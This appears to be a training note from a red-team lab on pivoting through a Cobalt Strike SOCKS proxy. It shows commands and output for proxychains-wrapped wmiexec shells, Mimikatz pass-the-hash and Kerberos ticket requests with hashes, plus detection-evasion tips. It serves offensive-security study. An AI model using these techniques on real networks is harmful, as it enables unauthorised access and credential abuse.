---
description: 09/30/2025
---

# Pivoting

## SOCKS Proxies

A <mark style="color:yellow;">**SOCKS**</mark> (short for _<mark style="color:yellow;">**Socket Secure**</mark>_) <mark style="color:yellow;">**Proxy**</mark> exchanges network packets between a client and a server.

A common implementation of a proxy is found in _**web proxies**_. _<mark style="color:$success;">**This is where a browser will connect to the proxy**</mark>_, _<mark style="color:$success;">**which relays requests to the destination website and returns back to the browser**</mark>_ (performing filtering etc. along the way).&#x20;

#### Offensive Uses

As a result, <mark style="color:green;">we can use this technology as an offensive application by turning our C2 server into a SOCKS proxy to tunnel external tooling into an internal network</mark>.&#x20;

### Use Cases

This is particularly useful when we want to leverage toolsets like [<mark style="color:yellow;">`Impacket`</mark>](https://github.com/SecureAuthCorp/impacket).  <mark style="color:$danger;">Windows doesn't have a native capability to execute Python</mark>, <mark style="color:$success;">so being able to execute them on our own system and tunnel the traffic through Beacon can expand our arsenal of available tooling</mark>. &#x20;

#### OPSEC Advantages

_<mark style="color:$success;">**Since we are not pushing offensive tooling onto the target or even executing any code on a compromised endpoint, we can massively shrink out footprint for detection**</mark>_!

### SOCKS Proxies in Cobalt Strike

Cobalt Strike has both a **SOCKS4a** and **SOCKS5** proxy.&#x20;

The main difference between them is that _**only**_**&#x20;SOCKS5** supports authentication and has some additional logging capabilities.

#### Usage

Use the <mark style="color:yellow;">`socks`</mark> command on the Beacon that you want to act as the pivot point.

**To start a SOCKS4a proxy, simply run:**

```
beacon> socks 1080
```

**To start a SOCKS5 proxy, run:**

```
beacon> socks 1080 socks5 disableNoAuth myUser myPassword enableLogging
```

{% hint style="info" %}
The <mark style="color:yellow;">`enableLogging`</mark> option sends additional logs (such as authentication failures) to the VM console, which you unfortunately can't see easily when the team server running as a service.
{% endhint %}

**Instead, we can use `journalctl`:**

```
ubuntu teamserver[687]: [*] SOCKS5 (18): ********** Constructing Socks5Command **********
ubuntu teamserver[687]: [*] SOCKS5 (18): Greeting: NoAuth Authentication offered: 0
ubuntu teamserver[687]: [*] SOCKS5 (18): Greeting: UserPwd Authentication offered: 2
ubuntu teamserver[687]: [*] SOCKS5 (18): sendChosenAuthentication: Chosen Authentication Type: 2
ubuntu teamserver[687]: [*] SOCKS5 (18): verifyUserPwd: Verifying User/Password Authentication
ubuntu teamserver[687]: [*] SOCKS5 (18): verifyUserPwd: Verifying user:
ubuntu teamserver[687]: [-] SOCKS5 (18): Invalid login attempt from user:
ubuntu teamserver[687]: [-] SOCKS (18): Socks Error
```

**You will now see port `1080` bound on the team server VM:**

```
attacker@ubuntu ~> sudo ss -lpnt
State    Recv-Q   Send-Q     Local Address:Port        Peer Address:Port   Process
LISTEN   0        128                    *:1080                   *:*       users:(("TeamServerImage",pid=687,fd=13))
```

{% hint style="danger" %}
**OPSEC**\
\
Since this is bound on all interfaces, any device that has network access to the team server VM may, in theory, interact with the SOCKS traffic. &#x20;

Even though this should not be the case, the use of SOCKS5 gives an additional layer of protection.
{% endhint %}

<mark style="color:$success;">So, use the</mark> <mark style="color:$success;"></mark><mark style="color:$success;">**SOCKS5**</mark> <mark style="color:$success;"></mark><mark style="color:$success;">proxy, lol.</mark>

The speed at which data is transferred over the proxy is determined by the sleep time of the Beacon that executed the <mark style="color:yellow;">`socks`</mark> command. &#x20;

To set the Beacon to an interactive state, use <mark style="color:yellow;">`sleep 0`</mark>.  In most cases, this is a quality of life vs stealth trade-off. &#x20;

The more frequently your Beacon talks to the team server, the louder it appears on the wire. However, some tools may timeout and fail with longer sleep times so it's up to you to find a balance.

## Linux Tools

<mark style="color:yellow;">`proxychains`</mark> is a tool which acts as a wrapper around other applications to tunnel their traffic over a **SOCKS** proxy.&#x20;

**First, we need to modify its configuration file to point to our Cobalt Strike SOCKS proxy server:**

```
attacker@DESKTOP-3BSK7NO ~> sudo vim /etc/proxychains.conf
```

At the bottom of the file, you will see a default entry for SOCKS4:  <mark style="color:yellow;">`socks4 127.0.0.1 9050`</mark>. &#x20;

**We need to change this to match the settings of the proxy we started in Beacon:**

* <mark style="color:$success;">**SOCKS4**</mark>:  <mark style="color:yellow;">`socks4 127.0.0.1 1080`</mark>

OR

* <mark style="color:$success;">SOCKS5</mark>:  <mark style="color:yellow;">`socks5 127.0.0.1 1080 myUser myPassword`</mark>

**To tunnel a tool through&#x20;**<mark style="color:yellow;">**`proxychains`**</mark>**, it's as simple as&#x20;**<mark style="color:yellow;">**`proxychains [tool] [tool args]`**</mark>**.  So to tunnel&#x20;**<mark style="color:yellow;">**`wmiexec`**</mark>**, it would be:**

```
ubuntu@DESKTOP-3BSK7NO ~ > proxychains wmiexec.py DEV/jking@10.10.122.30
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:135-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:49667-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
dev\jking

C:\>hostname
web
```

## Windows Tools

We can also _<mark style="color:$success;">**tunnel traffic from our Windows machine**</mark>_ using a software utility called [<mark style="color:yellow;">`Proxifier`</mark>](https://www.proxifier.com/).&#x20;

**To create a new proxy entry, go to Profile > Proxy Servers.  Click Add and enter the relevant details:**

<figure><img src="../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

When asked if you want to use this proxy by default, select **NO**.

Select **YES** when prompted to go to the **Proxification Rules**.

Here, you will tell Proxifier which applications to proxy and under what conditions.

Click **Add** to create a new rule and use the following:

* **Name:** `Tools`
* **Applications**:  `Any`
* **Target** **hosts**:  `10.10.120.0/24;10.10.122.0/23`
* **Target** **ports**:  `Any`
* **Action**:  `Proxy SOCKS5 10.10.5.50`

<figure><img src="../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

To enable authentication to occur over the proxy, an application needs to be launched as a user from the target domain. This can be achieved via `runas /netonly` or on Mimikatz.

Let's use Active Directory Users and Computers (ADUC) as an example here:

The file responsible for launching ADUC is <mark style="color:yellow;">`dsa.msc`</mark>, which is actually just a snap-in for <mark style="color:yellow;">`mmc.exe`</mark>.&#x20;

**Open a Command Prompt window as a local admin, then launch&#x20;**<mark style="color:yellow;">**`mmc.exe`**</mark>**&#x20;via&#x20;**<mark style="color:yellow;">**`runas`**</mark>**:**

```
PS C:\Users\Attacker> runas /netonly /user:DEV\bfarmer mmc.exe
Enter the password for DEV\bfarmer:
Attempting to start mmc.exe as user "DEV\bfarmer" ...
```

#### How-to

Go to **File > Add/Remove Snap-in** (or Ctrl + M for short), add the ADUC snap-in, then click OK. &#x20;

Right-click on the snap-in, select **Change Domain**, enter <mark style="color:yellow;">`dev.cyberbotic.io`</mark> and click OK. &#x20;

You will see `Proxifier` begin to capture and relay traffic and ADUC loads the content. &#x20;

You may continue to drill down into the users and computers etc.

<figure><img src="../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

**To achieve the same with Mimikatz:**

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
```

**PowerShell cmdlets that support credential objects can also be used:**

```
PS C:\Users\Attacker> $cred = Get-Credential
PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select DNSHostName

DNSHostName
-----------
dc-2.dev.cyberbotic.io
fs.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
web.dev.cyberbotic.io
sql-2.dev.cyberbotic.io
wkstn-1.dev.cyberbotic.io
```

## Pivoting with Kerberos

In the previous examples, we leveraged both plaintext credentials (with <mark style="color:yellow;">`Impacket`</mark> and <mark style="color:yellow;">`runas /netonly`</mark>) and NTLM (with Mimikatz) to authenticate to resources over the **SOCKS** proxy.

However, it is possible to use Kerberos tickets as well.

Using <mark style="color:yellow;">`Impacket`</mark> through <mark style="color:yellow;">`proxychains`</mark> is a popular way to do so.

**First, let's use&#x20;**<mark style="color:yellow;">**`getTGT.py`**</mark>**&#x20;to request a TGT for&#x20;**<mark style="color:yellow;">**`jking`**</mark>**&#x20;with their AES-256 hash:**

```
ubuntu@DESKTOP-3BSK7NO ~> proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
[*] Saving ticket in jking.ccache
```

